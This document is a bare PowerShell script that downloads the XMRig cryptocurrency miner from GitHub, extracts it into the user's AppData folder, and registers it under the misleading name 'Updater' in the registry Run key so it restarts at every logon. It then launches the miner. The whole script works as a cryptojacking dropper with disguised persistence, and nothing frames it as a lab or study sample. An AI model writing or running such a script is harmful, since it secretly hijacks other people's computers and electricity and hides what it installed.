$path = "$env:APPDATA\xmrig\xmrig.exe"
Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip" -OutFile "$env:TEMP\x.zip"
Expand-Archive "$env:TEMP\x.zip" -DestinationPath "$env:APPDATA\xmrig" -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value $path
Start-Process $path
